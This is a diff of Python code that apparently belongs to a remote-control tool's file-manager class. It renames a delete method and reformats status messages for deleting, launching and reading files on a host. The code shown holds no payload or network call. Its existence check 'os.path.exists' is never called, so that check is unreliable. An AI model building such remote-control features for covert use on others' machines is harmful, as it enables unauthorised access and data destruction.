@@ -12,7 +12,7 @@ class LASTINPUTINFO(Structure):
     ]
 
 class manager():
-    def delete_file(self, path):
+    def delete_path(self, path):
         try:
             if os.path.isdir(path):
                 shutil.rmtree(path)
@@ -21,7 +21,7 @@ class manager():
 
             return "[+] Successfully deleted: {} from the system.".format(path)
         except Exception as e:
-            return "[-] Error deleting: {} from the system: {}.".format(path, e)
+            return "[-] Error deleting: {} from the system: {}".format(path, e)
 
     def launch_file(self, path):
         try:
@@ -37,20 +37,19 @@ class manager():
     def read_content_of_file(self, path):
         try:
             if os.path.exists and os.path.isfile(path):
-                data = "Content of the file:\n"
-
                 with open(path, "r") as file:
                     file_data = file.read()
                     if len(file_data) == 0:
-                        data += "File is Empty!\n"
+                        return "File is Empty!\n"
                     else:
-                        data += file_data + "\n"
+                        data = "Content of the file:\n{}\n".format(file_data)                        
+
 
                 return data
             else:
                 return "[-] The path you specified is not valid."
         except Exception as e:            
-            return "[-] Couldn't read: {} content: {}".format(path, e)
+            return "[-] Couldn't read: {}'s content: {}.".format(path, e)
     
     def play_sound(self, path, should_stop):
         try:
